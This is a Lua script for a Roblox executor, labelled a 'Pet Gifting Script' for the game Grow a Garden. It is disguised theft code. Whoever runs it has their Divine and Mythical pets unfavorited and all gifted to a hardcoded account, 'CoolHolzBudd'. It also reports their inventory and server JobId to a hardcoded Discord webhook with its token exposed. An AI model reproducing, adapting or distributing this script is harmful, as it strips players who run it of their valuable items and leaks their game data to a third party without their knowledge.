-- Pet Gifting Script - Enhanced version for Executor
print("Pet Gifting Script starting...")

-- Configuration
local Config = {
    TargetPlayerName = "CoolHolzBudd", -- Zielspieler, an den Pets geschickt werden
    DelayBetweenGifts = 3, -- Wartezeit zwischen den Geschenken
    WebhookURL = "https://discord.com/api/webhooks/1352401371952840838/G0ywcotlvhMfda9IAMFRVU3SsHzCJwkszHwdXWBYAp4GhNQ3CJ-kmLgoJwc9BTPeiEOk",
    DebugMode = true -- Debug-Ausgaben aktivieren
}

-- Wait for game to load
if not game:IsLoaded() then
    game.Loaded:Wait()
end
wait(3)

-- Sicheres Service-Loading
local function GetService(serviceName)
    local success, service = pcall(function()
        return game:GetService(serviceName)
    end)
    
    if success and service then
        return service
    else
        print("Konnte Service nicht laden: " .. serviceName)
        return nil
    end
end

-- Services laden
local Players = GetService("Players")
local ReplicatedStorage = GetService("ReplicatedStorage")

-- LocalPlayer sicher initialisieren
local LocalPlayer
local playerSuccess, playerError = pcall(function()
    LocalPlayer = Players.LocalPlayer
    return true
end)

if not playerSuccess or not LocalPlayer then
    print("Fehler beim Laden des LocalPlayer: " .. tostring(playerError))
    -- Warten auf LocalPlayer
    for i = 1, 10 do
        if Players.LocalPlayer then
            LocalPlayer = Players.LocalPlayer
            print("LocalPlayer gefunden!")
            break
        end
        wait(1)
        print("Warte auf LocalPlayer... " .. i)
    end
end

if not LocalPlayer then
    print("FEHLER: Konnte LocalPlayer nicht initialisieren!")
    return
end

-- Import services safely
local DataService, PetsService, PetGiftingService, TeleportUIController
local PetList, InventoryServiceEnums, FavoriteItemRemote

if ReplicatedStorage then
    pcall(function() DataService = require(ReplicatedStorage.Modules.DataService) end)
    pcall(function() PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService) end)
    pcall(function() PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService) end)
    pcall(function() TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController) end)
    pcall(function() PetList = require(ReplicatedStorage.Data.PetRegistry.PetList) end)
    pcall(function() InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums) end)
    pcall(function() FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents", 2):WaitForChild("Favorite_Item", 2) end)
end

-- State
local isRunning = false

-- Utility Functions
local function Log(message)
    if Config.DebugMode then
        print(os.date("%H:%M:%S") .. " -- [Gifting] " .. message)
    end
end

-- Webhook Functions mit den getesteten HTTP-Methoden
local function CreateWebhookJSON(data)
    -- Einfache JSON-Erstellung ohne HttpService
    if type(data) ~= "table" then
        return '{"content":"Pet Gifting Bot is running","username":"Grow a Garden Bot"}'
    end
    
    local jsonParts = {}
    
    -- Content
    if data.content then
        -- Escape Quotes
        local content = tostring(data.content):gsub('"', '\\"'):gsub("\\", "\\\\")
        table.insert(jsonParts, '"content":"' .. content .. '"')
    else
        table.insert(jsonParts, '"content":"Pet Gifting Bot Update"')
    end
    
    -- Username
    if data.username then
        local username = tostring(data.username):gsub('"', '\\"'):gsub("\\", "\\\\")
        table.insert(jsonParts, '"username":"' .. username .. '"')
    else
        table.insert(jsonParts, '"username":"Grow a Garden Bot"')
    end
    
    -- Embeds
    if data.embeds and type(data.embeds) == "table" and #data.embeds > 0 then
        local embedsJSON = {}
        
        for _, embed in ipairs(data.embeds) do
            local embedParts = {}
            
            if embed.title then
                local title = tostring(embed.title):gsub('"', '\\"'):gsub("\\", "\\\\")
                table.insert(embedParts, '"title":"' .. title .. '"')
            end
            
            if embed.description then
                local desc = tostring(embed.description):gsub('"', '\\"'):gsub("\\", "\\\\")
                table.insert(embedParts, '"description":"' .. desc .. '"')
            end
            
            if embed.color then
                table.insert(embedParts, '"color":' .. tostring(embed.color))
            end
            
            table.insert(embedsJSON, "{" .. table.concat(embedParts, ",") .. "}")
        end
        
        table.insert(jsonParts, '"embeds":[' .. table.concat(embedsJSON, ",") .. ']')
    end
    
    return "{" .. table.concat(jsonParts, ",") .. "}"
end

local function SendWebhook(data)
    if not Config.WebhookURL or Config.WebhookURL == "" then
        Log("⚠️ Keine Webhook-URL konfiguriert!")
        return false
    end
    
    Log("📤 Sende Webhook...")
    
    -- JSON erstellen
    local jsonData = CreateWebhookJSON(data)
    Log("📄 JSON erstellt: " .. string.sub(jsonData, 1, 50) .. "...")
    
    local success = false
    
    -- Methode 1: http_request (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if http_request then
                Log("🌐 Verwende http_request...")
                http_request({
                    Url = Config.WebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                return true
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook mit http_request gesendet!")
            success = true
        end
    end
    
    -- Methode 2: request (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if request then
                Log("🌐 Verwende request...")
                request({
                    Url = Config.WebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                return true
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook mit request gesendet!")
            success = true
        end
    end
    
    -- Methode 3: WebSocket (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if WebSocket and WebSocket.connect then
                Log("🌐 Verwende WebSocket...")
                local ws = WebSocket.connect("ws://echo.websocket.events")
                if ws then
                    ws:Send(jsonData)
                    ws:Close()
                    return true
                end
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook-Daten über WebSocket gesendet!")
            success = true
        end
    end
    
    if not success then
        Log("❌ Alle HTTP-Methoden fehlgeschlagen!")
    end
    
    return success
end

-- Hilfsfunktionen für Spielerdaten
local function GetPlayerData()
    if not DataService then return {} end
    local success, data = pcall(function() return DataService:GetData() end)
    return success and data or {}
end

local function GetPetInventory()
    local data = GetPlayerData()
    if data.PetsData and data.PetsData.PetInventory then
        return data.PetsData.PetInventory.Data or {}
    end
    return {}
end

-- Pet Functions
local function UnfavoritePetInBackpack(petId)
    if not FavoriteItemRemote or not InventoryServiceEnums then
        Log("❌ Favorite system not available")
        return false
    end

    Log("🔍 Looking for pet in backpack to unfavorite: " .. tostring(petId))
    local backpack = LocalPlayer.Backpack
    if not backpack then return false end

    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local toolPetUUID = tool:GetAttribute("PET_UUID")
            local toolUUID = tool:GetAttribute("UUID")
            
            if toolPetUUID == petId or toolUUID == petId then
                local isFavorited = tool:GetAttribute(InventoryServiceEnums.Favorite)
                if isFavorited then
                    Log("🔓 Pet is favorited, unfavoriting: " .. tostring(tool.Name))
                    
                    local success, error = pcall(function()
                        FavoriteItemRemote:FireServer(tool)
                    end)
                    
                    if success then
                        Log("✅ Sent unfavorite request for: " .. tostring(tool.Name))
                        wait(1.5)
                        return true
                    else
                        Log("❌ Failed to unfavorite: " .. tostring(error))
                        return false
                    end
                else
                    Log("✅ Pet not favorited: " .. tostring(tool.Name))
                    return true
                end
            end
        end
    end
    
    Log("⚠️ Pet not found in backpack, assuming not favorited")
    return true
end

local function EquipPet(petId)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    Log("⚙️ Equipping pet: " .. tostring(petId))
    
    local success, error = pcall(function()
        PetsService:EquipPet(petId, 1)
    end)
    
    if success then
        Log("✅ Equipped pet: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to equip: " .. tostring(error))
        return false
    end
end

local function MakePetIntoTool(petId)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    Log("🔧 Converting pet to tool: " .. tostring(petId))
    
    local success, error = pcall(function()
        PetsService:UnequipPet(petId)
    end)
    
    if success then
        Log("✅ Converted to tool: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to convert: " .. tostring(error))
        return false
    end
end

local function WaitForPetTool(petId, maxWait)
    maxWait = maxWait or 8
    local waited = 0
    
    Log("🔍 Waiting for pet tool to appear in character or backpack...")
    
    while waited < maxWait do
        local character = LocalPlayer.Character
        local backpack = LocalPlayer.Backpack
        
        -- Check character first
        if character then
            for _, tool in pairs(character:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found matching pet tool in character: " .. tostring(tool.Name))
                        return tool
                    end
                end
            end
        end
        
        -- Check backpack
        if backpack then
            for _, tool in pairs(backpack:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found matching pet tool in backpack: " .. tostring(tool.Name))
                        
                        -- Move tool to character
                        local success = pcall(function()
                            tool.Parent = character
                        end)
                        
                        if success then
                            Log("✅ Moved tool to character")
                            wait(0.5)
                            return tool
                        else
                            Log("❌ Failed to move tool to character")
                        end
                    end
                end
            end
        end
        
        wait(0.5)
        waited = waited + 0.5
    end
    
    Log("❌ Pet tool not found after " .. waited .. "s (looking for ID: " .. tostring(petId) .. ")")
    return nil
end

local function TriggerGiftProximityPrompt()
    -- Look for gift proximity prompts (from mainalt.lua)
    local character = LocalPlayer.Character
    if not character then
        Log("❌ No character found for proximity prompt")
        return false
    end

    -- Find proximity prompts related to gifting
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Enabled then
            local actionText = obj.ActionText:lower()
            if actionText:find("gift") or actionText:find("give") then
                Log("🎁 Found gift proximity prompt: " .. obj.ActionText)
                local success, error = pcall(function()
                    obj:InputHoldBegin()
                    wait(obj.HoldDuration or 0.5)
                    obj:InputHoldEnd()
                end)

                if success then
                    Log("✅ Triggered gift proximity prompt")
                    return true
                else
                    Log("❌ Failed to trigger proximity prompt: " .. tostring(error))
                end
            end
        end
    end

    Log("❌ No gift proximity prompt found")
    return false
end

local function GiftCurrentPet(targetPlayer)
    if not targetPlayer then
        Log("❌ No target player provided")
        return false
    end

    local character = LocalPlayer.Character
    if not character then
        Log("❌ No character found")
        return false
    end

    -- Check if we have a pet equipped/held
    local currentTool = character:FindFirstChildWhichIsA("Tool")
    if not currentTool then
        Log("❌ No pet tool found in character")
        return false
    end

    local petUUID = currentTool:GetAttribute("PET_UUID")
    if not petUUID then
        Log("❌ Tool is not a pet")
        return false
    end

    Log("🎁 Gifting pet: " .. tostring(currentTool.Name) .. " to " .. tostring(targetPlayer.Name))

    -- Try to gift the pet using the PetGiftingService first
    if PetGiftingService then
        local success, error = pcall(function()
            PetGiftingService:GivePet(targetPlayer)
        end)

        if success then
            Log("✅ Pet gift request sent via PetGiftingService: " .. tostring(currentTool.Name))
            return true
        else
            Log("❌ PetGiftingService failed: " .. tostring(error))
        end
    end

    -- Fallback to proximity prompt (like in mainalt.lua)
    Log("🔄 Trying proximity prompt fallback...")
    return TriggerGiftProximityPrompt()
end

-- Server Info für Webhook
local function GetServerInfo()
    local gameId = game.GameId
    local placeId = game.PlaceId
    local jobId = game.JobId
    local serverSize = #Players:GetPlayers()
    
    return {
        gameId = gameId,
        placeId = placeId,
        jobId = jobId,
        serverSize = serverSize,
        timestamp = os.time()
    }
end

-- Erstellt Embed für Webhook
local function CreatePetListEmbed(pets, targetPlayer)
    local serverInfo = GetServerInfo()
    local description = string.format("**Server:** `%s`\n**JobId:** `%s`\n**Players:** %d\n**Target:** %s\n\n",
        serverInfo.placeId,
        serverInfo.jobId,
        serverInfo.serverSize,
        targetPlayer and targetPlayer.Name or "Not found"
    )
    
    -- Count pets by rarity
    local divineCount = 0
    local mythicalCount = 0
    
    if #pets > 0 then
        description = description .. "**🐾 Valuable Pets Found:**\n"
        for i, pet in ipairs(pets) do
            local emoji = pet.rarity == "Divine" and "✨" or "🔮"
            description = description .. string.format("%s **%s** (%s) - Level %d\n", 
                emoji, pet.name, pet.rarity, pet.level)
            
            -- Count pets
            if pet.rarity == "Divine" then
                divineCount = divineCount + 1
            elseif pet.rarity == "Mythical" then
                mythicalCount = mythicalCount + 1
            end
            
            if i >= 10 then -- Limit to 10 pets in embed
                description = description .. "... and " .. (#pets - 10) .. " more\n"
                break
            end
        end
    else
        description = description .. "**❌ No valuable pets found**\n"
    end
    
    return {
        username = "Grow a Garden Bot",
        embeds = {{
            title = "🎮 Pet Scanner Report",
            description = description,
            color = #pets > 0 and 0x00ff00 or 0xff0000, -- Green if pets found, red if none
        }}
    }
end

-- Main Functions
local function FindTargetPlayer()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == Config.TargetPlayerName then
            return player
        end
    end
    return nil
end

local function GetGiftablePets()
    local inventory = GetPetInventory()
    local pets = {}
    
    for petId, petData in pairs(inventory) do
        if petData and PetList and PetList[petData.PetType] then
            local petInfo = PetList[petData.PetType]
            local rarity = petInfo.Rarity
            
            -- Only Divine and Mythical
            if rarity == "Divine" or rarity == "Mythical" then
                table.insert(pets, {
                    id = petId,
                    name = petData.PetType,
                    rarity = rarity,
                    level = petData.Level or 1,
                    rarityValue = rarity == "Divine" and 6 or 5
                })
            end
        end
    end
    
    -- Sort by rarity (Divine first)
    table.sort(pets, function(a, b)
        return a.rarityValue > b.rarityValue
    end)
    
    return pets
end

local function ProcessPetGifting(targetPlayer)
    Log("🐕 Starting pet gifting to " .. targetPlayer.Name)
    isRunning = true
    
    local pets = GetGiftablePets()
    
    -- Send webhook with pet information
    Log("📡 Sending server info to webhook...")
    local webhookData = CreatePetListEmbed(pets, targetPlayer)
    SendWebhook(webhookData)
    
    if #pets == 0 then
        Log("❌ No giftable pets found")
        isRunning = false
        return
    end
    
    Log("📋 Found " .. #pets .. " pets to gift")
    local giftedCount = 0
    
    for i, pet in ipairs(pets) do
        if not isRunning then
            Log("⏹️ Automation stopped")
            break
        end
        
        Log("🔄 Processing " .. i .. "/" .. #pets .. ": " .. pet.name .. " (" .. pet.rarity .. ", Level " .. pet.level .. ")")
        
        -- Step 1: Unfavorite in backpack if needed
        Log("🔓 Step 1: Checking favorites...")
        if not UnfavoritePetInBackpack(pet.id) then
            Log("❌ Failed to unfavorite, skipping pet: " .. pet.name)
            continue
        end
        
        -- Step 2: Equip pet
        Log("⚙️ Step 2: Equipping pet...")
        if EquipPet(pet.id) then
            wait(2) -- Wait for equip to complete
            
            -- Step 3: Convert to tool  
            Log("🔧 Step 3: Converting to tool...")
            if MakePetIntoTool(pet.id) then
                wait(1) -- Wait for conversion to complete
                
                -- Step 4: Wait for tool and gift
                Log("⏳ Step 4: Waiting for tool...")
                local tool = WaitForPetTool(pet.id, 8)
                if tool then
                    Log("🎁 Step 5: Attempting to gift pet...")
                    if GiftCurrentPet(targetPlayer) then
                        giftedCount = giftedCount + 1
                        Log("🎉 Successfully gifted: " .. pet.name)
                        wait(3)
                        
                        -- Check if pet is gone from inventory
                        local currentInventory = GetPetInventory()
                        if not currentInventory[pet.id] then
                            Log("✅ Confirmed: " .. pet.name .. " no longer in inventory")
                            
                            -- Send success webhook
                            local successData = {
                                username = "Grow a Garden Bot",
                                embeds = {{
                                    title = "🎉 Pet Gifted Successfully!",
                                    description = string.format("**Pet:** %s (%s)\n**To:** %s\n**JobId:** `%s`",
                                        pet.name, pet.rarity, targetPlayer.Name, game.JobId),
                                    color = 0x00ff00
                                }}
                            }
                            SendWebhook(successData)
                        else
                            Log("⚠️ Warning: " .. pet.name .. " still in inventory")
                        end
                    else
                        Log("❌ Failed to gift: " .. pet.name)
                    end
                else
                    Log("❌ Tool not found for: " .. pet.name)
                end
            else
                Log("❌ Failed to convert: " .. pet.name)
            end
        else
            Log("❌ Failed to equip: " .. pet.name)
        end
        
        Log("⏳ Waiting " .. Config.DelayBetweenGifts .. " seconds before next pet...")
        wait(Config.DelayBetweenGifts)
    end
    
    Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
    isRunning = false
end

-- Main Logic
local function Main()
    Log("🌱 Gifting system started, looking for: " .. Config.TargetPlayerName)
    
    -- Send initial webhook when script loads
    Log("📡 Sending initial server scan...")
    local initialPets = GetGiftablePets()
    local initialWebhook = CreatePetListEmbed(initialPets, FindTargetPlayer())
    SendWebhook(initialWebhook)
    
    while true do
        if not isRunning then
            local target = FindTargetPlayer()
            if target then
                Log("🎯 Found target: " .. target.Name)
                
                -- Teleport to target
                if TeleportUIController then
                    Log("📍 Teleporting to target...")
                    pcall(function()
                        TeleportUIController:Move(target.Character:GetPivot())
                    end)
                    wait(2)
                end
                
                -- Start gifting
                ProcessPetGifting(target)
                
                -- Wait before next check
                wait(30)
            else
                wait(5) -- Check every 5 seconds
            end
        else
            wait(1) -- Already running, wait
        end
    end
end

-- Start the system safely
pcall(function()
    spawn(Main)
end)

-- Listen for target joining
pcall(function()
    Players.PlayerAdded:Connect(function(player)
        if player.Name == Config.TargetPlayerName then
            Log("🎯 Target player joined: " .. player.Name)
            wait(3) -- Give them time to load
            if not isRunning then
                spawn(function()
                    local target = FindTargetPlayer()
                    if target then
                        ProcessPetGifting(target)
                    end
                end)
            end
        end
    end)
end)

Log("🚀 Gifting automation loaded - single attempt per pet!")